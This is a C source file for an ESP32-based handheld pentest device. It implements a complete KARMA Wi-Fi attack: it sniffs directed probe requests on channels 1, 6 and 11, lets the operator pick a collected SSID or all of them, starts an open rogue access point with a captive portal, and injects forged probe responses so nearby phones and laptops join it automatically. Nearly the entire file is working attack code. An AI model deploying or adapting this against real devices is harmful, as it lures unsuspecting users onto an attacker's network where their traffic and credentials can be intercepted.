/*
 * wifi_karma.c - KARMA attack sub-application.
 *
 * Devices broadcast directed probe requests for previously known SSIDs.
 * We sniff them, then stand up an open AP matching the requested SSID and
 * inject unicast probe responses so scanning devices see our AP immediately.
 *
 * Flow:
 *   SNIFF   - monitor mode, hop ch1/6/11 every 2.5 s, collect unique SSIDs
 *   SELECT  - user picks one collected SSID, OR "[ All SSIDs ]" for auto mode
 *   RUNNING - open SoftAP + captive portal + probe-response injection
 *
 * Probe request frame layout:
 *   frame[0]  = 0x40  (FC type=MGMT sub=ProbeReq)
 *   frame[25] = SSID length (0 = wildcard, ignored)
 *   frame[26..] = SSID bytes
 */
#ifdef BS_WIFI_ESP32
#ifdef ARDUINO_ARCH_ESP32

#include "wifi_karma.h"

#include "bs/bs_wifi.h"
#include "bs/bs_gfx.h"
#include "bs/bs_nav.h"
#include "bs/bs_theme.h"
#include "bs/bs_ui.h"
#include "bs/bs_arch.h"

#include "esp_wifi.h"

#include <string.h>
#include <stdio.h>
#include <stdarg.h>

#include "wifi_common.h"
#include "wifi_portal.h"

/* ── Config ─────────────────────────────────────────────────────────────── */

#define KA_MAX_SSIDS        32
#define KA_LOG_LINES         5
#define KA_LOG_LEN          48
#define KA_HOP_MS         2500   /* channel dwell during sniff              */
#define KA_REFRESH_MS     1000

static const uint8_t  k_sniff_channels[] = {1, 6, 11};
#define KA_NCHANNELS  3

/* ── Phase ───────────────────────────────────────────────────────────────── */

typedef enum { KA_SNIFF, KA_SELECT, KA_RUNNING } ka_phase_t;

/* ── Probe collection (WiFi task → main loop) ────────────────────────────── */

static char         s_ssids[KA_MAX_SSIDS][33];
static volatile int s_ssid_count;

/* ── App state ───────────────────────────────────────────────────────────── */

static ka_phase_t   s_phase;
static int          s_cursor;     /* 0 = "All SSIDs", 1..n = specific SSID */
static int          s_ch_idx;
static uint32_t     s_last_hop_ms;

static char         s_target_ssid[33];  /* empty = auto (all)               */
static bool         s_karma_auto;
static uint8_t      s_karma_bssid[6];
static uint8_t      s_ap_ch;

static int          s_prev_clients;

/* Probe-response injection state (set from promiscuous cb, used in main loop) */
static volatile bool s_probe_pending;
static uint8_t       s_probe_src[6];
static char          s_probe_ssid[33];

static char         s_log[KA_LOG_LINES][KA_LOG_LEN];
static int          s_log_head;
static int          s_log_count;

/* ── Helpers ─────────────────────────────────────────────────────────────── */

static void ka_log(const char* fmt, ...) {
    va_list ap;
    va_start(ap, fmt);
    vsnprintf(s_log[s_log_head], KA_LOG_LEN, fmt, ap);
    va_end(ap);
    s_log[s_log_head][KA_LOG_LEN - 1] = '\0';
    s_log_head = (s_log_head + 1) % KA_LOG_LINES;
    if (s_log_count < KA_LOG_LINES) s_log_count++;
}

/* ── Probe sniffer callback ──────────────────────────────────────────────── */

static void probe_cb(const uint8_t* frame, uint16_t len,
                     int8_t rssi, void* ctx) {
    (void)rssi; (void)ctx;
    if (len < 28) return;
    if ((frame[0] & 0xFC) != 0x40) return;

    uint8_t ssid_len = frame[25];
    if (ssid_len == 0 || ssid_len > 32) return;

    char ssid[33];
    memcpy(ssid, &frame[26], ssid_len);
    ssid[ssid_len] = '\0';

    bool printable = false;
    for (int i = 0; i < (int)ssid_len; i++)
        if ((unsigned char)ssid[i] > ' ') { printable = true; break; }
    if (!printable) return;

    int count = s_ssid_count;
    for (int i = 0; i < count; i++)
        if (strcmp(s_ssids[i], ssid) == 0) return;
    if (count >= KA_MAX_SSIDS) return;

    strncpy(s_ssids[count], ssid, 32);
    s_ssids[count][32] = '\0';
    __atomic_store_n(&s_ssid_count, count + 1, __ATOMIC_RELEASE);
}

/* ── Probe response injection ────────────────────────────────────────────── */

/* Runs in APSTA mode; queues unicast probe responses for matching probe requests. */
static void ap_probe_cb(void* buf, wifi_promiscuous_pkt_type_t type) {
    if (type != WIFI_PKT_MGMT) return;
    const wifi_promiscuous_pkt_t* pkt =
        (const wifi_promiscuous_pkt_t*)buf;
    const uint8_t* f = pkt->payload;
    uint16_t len = (uint16_t)pkt->rx_ctrl.sig_len;
    if (len >= 4) len -= 4;
    if (len < 28) return;
    if ((f[0] & 0xFC) != 0x40) return;   /* not a probe request */

    uint8_t ssid_len = f[25];
    if (ssid_len == 0 || ssid_len > 32) return;

    char ssid[33];
    memcpy(ssid, f + 26, ssid_len);
    ssid[ssid_len] = '\0';

    bool match = false;
    if (s_karma_auto) {
        int count = __atomic_load_n(&s_ssid_count, __ATOMIC_ACQUIRE);
        for (int i = 0; i < count; i++)
            if (strcmp(s_ssids[i], ssid) == 0) { match = true; break; }
    } else {
        match = (strcmp(s_target_ssid, ssid) == 0);
    }
    if (!match) return;

    /* Only queue one at a time; main loop drains it */
    if (!s_probe_pending) {
        memcpy(s_probe_src, f + 10, 6);   /* Addr2 = probing STA MAC */
        strncpy(s_probe_ssid, ssid, 32);
        s_probe_ssid[32] = '\0';
        __atomic_store_n(&s_probe_pending, true, __ATOMIC_RELEASE);
    }
}

/* Probe response (0x50) = beacon body addressed to the scanning STA. */
static void send_probe_response(const uint8_t* client_mac, const char* ssid) {
    uint8_t frame[200];
    int flen = wifi_build_beacon(frame, sizeof(frame),
                                 ssid, s_karma_bssid, s_ap_ch);
    if (flen <= 0) return;
    frame[0] = 0x50;                          /* beacon→probe response */
    memcpy(frame + 4, client_mac, 6);         /* Addr1 = requesting STA */
    bs_wifi_send_raw(BS_WIFI_IF_STA, frame, (uint16_t)flen);
}

static void start_probe_monitor(void) {
    wifi_promiscuous_filter_t f = (wifi_promiscuous_filter_t){0};
    f.filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT;
    esp_wifi_set_promiscuous_filter(&f);
    esp_wifi_set_promiscuous_rx_cb(ap_probe_cb);
    esp_wifi_set_promiscuous(true);
}

static void stop_probe_monitor(void) {
    esp_wifi_set_promiscuous(false);
}

static void draw_sniff_status_row(int y, float ts) {
    int sw       = bs_gfx_width();
    int rh       = bs_ui_row_h(ts);
    int pad_y    = (rh - bs_gfx_text_h(ts)) / 2;
    int total_w  = sw - 16;
    int gap      = 6;
    int label_w  = (total_w * 60) / 100;   /* deliberately capped so long text can marquee */
    int value_w  = total_w - label_w - gap;
    if (label_w < 96) label_w = 96;
    if (value_w < 28) value_w = 28;
    if (label_w + value_w + gap > total_w) label_w = total_w - value_w - gap;

    int lx = 8;
    int vx = lx + label_w + gap;

    bs_gfx_fill_rect(lx - 2, y - 1, label_w + 4, rh, g_bs_theme.dim);
    bs_gfx_fill_rect(vx - 2, y - 1, value_w + 4, rh, g_bs_theme.dim);

    char value_buf[16];
    snprintf(value_buf, sizeof(value_buf), "%d", k_sniff_channels[s_ch_idx]);
    int value_tw = bs_gfx_text_w(value_buf, ts);
    int value_tx = vx + (value_w - value_tw) / 2;
    if (value_tx < vx) value_tx = vx;

    bs_ui_draw_text_box(lx, y + pad_y, label_w, "Sniffing on channel", g_bs_theme.secondary, ts, true);
    bs_gfx_text(value_tx, y + pad_y, value_buf, g_bs_theme.accent, ts);
}

/* ── Draw ────────────────────────────────────────────────────────────────── */

static void draw_sniff(void) {
    float ts  = bs_ui_text_scale();
    float ts2 = ts > 1.0f ? ts - 1.0f : 1.0f;
    int sw  = bs_gfx_width();
    int y   = bs_ui_content_y();
    int lh  = bs_gfx_text_h(ts)  + 4;
    int lh2 = bs_gfx_text_h(ts2) + 3;

    bs_gfx_clear(g_bs_theme.bg);
    bs_ui_draw_header("Karma");

    draw_sniff_status_row(y, ts);
    y += bs_ui_row_h(ts);

    char buf[64];
    int count = __atomic_load_n(&s_ssid_count, __ATOMIC_ACQUIRE);
    snprintf(buf, sizeof(buf), "Collected: %d SSID%s",
             count, count == 1 ? "" : "s");
    bs_ui_draw_text_box(8, y, sw - 16, buf, g_bs_theme.accent, ts2, true);
    y += lh2 + 6;

    int show = count < 5 ? count : 5;
    for (int i = count - show; i < count; i++) {
        if (y + lh2 > bs_gfx_height() - bs_gfx_text_h(ts2) - 6) break;
        bs_color_t c = (i == count - 1) ? g_bs_theme.accent : g_bs_theme.dim;
        bs_ui_draw_text_box(12, y, sw - 20, s_ssids[i], c, ts2, true);
        y += lh2;
    }

    bs_ui_draw_hint(count ? "SELECT=pick  BACK=exit" : "BACK=exit");
    bs_gfx_present();
}

static void draw_select(void) {
    float ts  = bs_ui_text_scale();
    float ts2 = ts > 1.0f ? ts - 1.0f : 1.0f;
    int sw  = bs_gfx_width();
    int cy  = bs_ui_content_y();
    int lh  = bs_gfx_text_h(ts) + 6;
    int count = __atomic_load_n(&s_ssid_count, __ATOMIC_ACQUIRE);
    int total = count + 1;

    bs_gfx_clear(g_bs_theme.bg);
    bs_ui_draw_header("Karma / Target");

    int hint_h  = bs_gfx_text_h(ts2) + 6;
    int visible = (bs_gfx_height() - cy - hint_h) / lh;
    if (visible < 1) visible = 1;

    int scroll = s_cursor - visible / 2;
    if (scroll < 0) scroll = 0;
    if (scroll > total - visible) scroll = total - visible;
    if (scroll < 0) scroll = 0;

    for (int i = 0; i < visible && (scroll + i) < total; i++) {
        int idx = scroll + i;
        bool sel = (idx == s_cursor);
        int  y   = cy + i * lh;
        if (sel) bs_gfx_fill_rect(0, y - 2, sw, lh - 1, g_bs_theme.dim);
        bs_color_t c = sel ? g_bs_theme.accent : g_bs_theme.primary;
        if (idx == 0) {
            char all_buf[40];
            snprintf(all_buf, sizeof(all_buf), "[ All %d SSIDs ]", count);
            bs_ui_draw_text_box(8, y, sw - 16, all_buf, c, ts, sel);
        } else {
            bs_ui_draw_text_box(8, y, sw - 16, s_ssids[idx - 1], c, ts, sel);
        }
    }

    bs_ui_draw_hint("SELECT=launch AP  BACK=sniff");
    bs_gfx_present();
}


static void draw_running(void) {
    float ts  = bs_ui_text_scale();
    float ts2 = ts > 1.0f ? ts - 1.0f : 1.0f;
    int sw  = bs_gfx_width();
    int y   = bs_ui_content_y();
    int lh  = bs_gfx_text_h(ts)  + 4;
    int lh2 = bs_gfx_text_h(ts2) + 3;

    bs_gfx_clear(g_bs_theme.bg);
    bs_ui_draw_header("Karma");

    char buf[80];
    if (s_karma_auto) {
        int count = __atomic_load_n(&s_ssid_count, __ATOMIC_ACQUIRE);
        snprintf(buf, sizeof(buf), "AUTO: %d SSIDs  ch%d", count, s_ap_ch);
    } else {
        snprintf(buf, sizeof(buf), "AP: %.40s  ch%d", s_target_ssid, s_ap_ch);
    }
    bs_ui_draw_text_box(8, y, sw - 16, buf, g_bs_theme.accent, ts, true);
    y += lh;

    wifi_sta_list_t sta = (wifi_sta_list_t){0};
    esp_wifi_ap_get_sta_list(&sta);
    snprintf(buf, sizeof(buf), "Clients: %d   IP: 192.168.4.1", sta.num);
    bs_ui_draw_text_box(8, y, sw - 16, buf, g_bs_theme.primary, ts2, true);
    y += lh2 + 4;

    bs_gfx_fill_rect(4, y, sw - 8, 1, g_bs_theme.dim);
    y += 5;

    for (int i = 0; i < s_log_count && i < KA_LOG_LINES; i++) {
        int idx = (s_log_head - s_log_count + i + KA_LOG_LINES * 2) % KA_LOG_LINES;
        bs_color_t c = (i == s_log_count - 1) ? g_bs_theme.accent : g_bs_theme.dim;
        int line_y = y + i * lh2;
        if (line_y + lh2 > bs_gfx_height() - bs_gfx_text_h(ts2) - 6) break;
        bs_ui_draw_text_box(8, line_y, sw - 16, s_log[idx], c, ts2, true);
    }

    bs_ui_draw_hint("BACK=stop");
    bs_gfx_present();
}

/* ── Main entry ──────────────────────────────────────────────────────────── */

void wifi_karma_run(const bs_arch_t* arch) {
    s_phase         = KA_SNIFF;
    s_cursor        = 0;
    s_ch_idx        = 0;
    s_karma_auto    = false;
    s_prev_clients  = 0;
    s_log_head      = 0;
    s_log_count     = 0;
    s_probe_pending = false;

    __atomic_store_n(&s_ssid_count, 0, __ATOMIC_RELEASE);
    memset(s_ssids, 0, sizeof(s_ssids));

    wifi_prng_t prng;
    wifi_prng_seed(&prng, (uint32_t)arch->millis() ^ 0xDEA7CA7Au);
    wifi_random_mac(&prng, s_karma_bssid);
    s_ap_ch = 1;

    bool dirty       = true;
    uint32_t last_refresh = 0;

    s_last_hop_ms = arch->millis();
    bs_wifi_monitor_start(k_sniff_channels[s_ch_idx], probe_cb, NULL);
    ka_log("Sniffing ch%d for probes...", k_sniff_channels[s_ch_idx]);

    uint32_t prev_ms = arch->millis();
    for (;;) {
        uint32_t now = arch->millis();
        bs_ui_advance_ms(now - prev_ms);
        prev_ms = now;

        /* ── Portal service (RUNNING) ───────────────────────────────────── */
        if (s_phase == KA_RUNNING && wifi_portal_active()) {
            wifi_portal_poll();

            /* Dispatch probe response queued by ap_probe_cb */
            if (__atomic_load_n(&s_probe_pending, __ATOMIC_ACQUIRE)) {
                __atomic_store_n(&s_probe_pending, false, __ATOMIC_RELEASE);
                send_probe_response(s_probe_src, s_probe_ssid);
                ka_log("Probe->resp  %02X:%02X:%02X:...",
                       s_probe_src[0], s_probe_src[1], s_probe_src[2]);
                dirty = true;
            }

            wifi_sta_list_t sta = (wifi_sta_list_t){0};
            esp_wifi_ap_get_sta_list(&sta);
            if (sta.num > s_prev_clients) {
                for (int i = s_prev_clients; i < (int)sta.num; i++) {
                    ka_log("Client %02X:%02X:%02X:.. joined",
                           sta.sta[i].mac[0],
                           sta.sta[i].mac[1],
                           sta.sta[i].mac[2]);
                }
                dirty = true;
            } else if (sta.num < s_prev_clients) {
                ka_log("Client disconnected");
                dirty = true;
            }
            s_prev_clients = sta.num;
        }

        /* ── Sniff: channel hop ──────────────────────────────────────────── */
        if (s_phase == KA_SNIFF) {
            if ((now - s_last_hop_ms) >= (uint32_t)KA_HOP_MS) {
                s_ch_idx = (s_ch_idx + 1) % KA_NCHANNELS;
                bs_wifi_set_channel(k_sniff_channels[s_ch_idx]);
                s_last_hop_ms = now;
                dirty = true;
            }
        }

        /* ── Input ──────────────────────────────────────────────────────── */
        bs_nav_id_t nav;
        while ((nav = bs_nav_poll()) != BS_NAV_NONE) {
            switch (s_phase) {

            case KA_SNIFF:
                if (nav == BS_NAV_BACK) {
                    bs_wifi_monitor_stop();
                    wifi_portal_stop();
                    return;
                }
                if (nav == BS_NAV_SELECT) {
                    int count = __atomic_load_n(&s_ssid_count, __ATOMIC_ACQUIRE);
                    if (count > 0) {
                        s_cursor = 0;  /* default to "All SSIDs" */
                        s_phase  = KA_SELECT;
                        dirty    = true;
                    }
                }
                break;

            case KA_SELECT: {
                int count = __atomic_load_n(&s_ssid_count, __ATOMIC_ACQUIRE);
                int total = count + 1;
                if (nav == BS_NAV_UP || nav == BS_NAV_PREV) {
                    if (s_cursor > 0) { s_cursor--; dirty = true; }
                } else if (nav == BS_NAV_DOWN || nav == BS_NAV_NEXT) {
                    if (s_cursor < total - 1) { s_cursor++; dirty = true; }
                } else if (nav == BS_NAV_SELECT) {
                    if (s_cursor == 0) {
                        s_karma_auto = true;
                        s_target_ssid[0] = '\0';
                        ka_log("AUTO: targeting %d SSIDs", count);
                    } else {
                        s_karma_auto = false;
                        strncpy(s_target_ssid, s_ssids[s_cursor - 1], 32);
                        s_target_ssid[32] = '\0';
                        ka_log("Target: %.28s", s_target_ssid);
                    }
                    /* Open AP only — karma targets open saved networks.
                     * For WPA2 evil-twin with PSK use the Evil Twin app. */
                    const char* ap_ssid = s_karma_auto
                                          ? (count > 0 ? s_ssids[0] : "FreeWifi")
                                          : s_target_ssid;
                    if (wifi_portal_start(ap_ssid, s_ap_ch, NULL)) {
                        ka_log("AP open ch%d  %.20s", s_ap_ch, ap_ssid);
                        start_probe_monitor();
                        s_probe_pending = false;
                        s_prev_clients  = 0;
                        s_phase         = KA_RUNNING;
                        last_refresh    = now;
                    } else {
                        ka_log("AP start FAILED");
                    }
                    dirty = true;
                } else if (nav == BS_NAV_BACK) {
                    s_phase = KA_SNIFF;
                    dirty   = true;
                }
                break;
            }

            case KA_RUNNING:
                if (nav == BS_NAV_BACK) {
                    ka_log("Portal stopped.");
                    stop_probe_monitor();
                    wifi_portal_stop();
                    return;
                }
                break;
            }
        }

        /* ── Draw ───────────────────────────────────────────────────────── */
        if (dirty) {
            dirty = false;
            switch (s_phase) {
            case KA_SNIFF:   draw_sniff();   break;
            case KA_SELECT:  draw_select();  break;
            case KA_RUNNING: draw_running(); break;
            }
            last_refresh = now;
        }

        uint32_t anim_ms = 0;
        switch (s_phase) {
            case KA_SNIFF:   anim_ms = bs_ui_carousel_enabled() ? 40U : 120U; break;
            case KA_SELECT:  anim_ms = bs_ui_carousel_enabled() ? 40U : 80U;  break;
            case KA_RUNNING: anim_ms = bs_ui_carousel_enabled() ? 40U : (uint32_t)KA_REFRESH_MS; break;
        }
        if ((uint32_t)(now - last_refresh) >= anim_ms) {
            last_refresh = now;
            switch (s_phase) {
                case KA_SNIFF:   draw_sniff();   break;
                case KA_SELECT:  draw_select();  break;
                case KA_RUNNING: draw_running(); break;
            }
        }

        arch->delay_ms(s_phase == KA_RUNNING ? 8 : 2);
    }
}

#endif /* ARDUINO_ARCH_ESP32 */
#endif /* BS_WIFI_ESP32 */
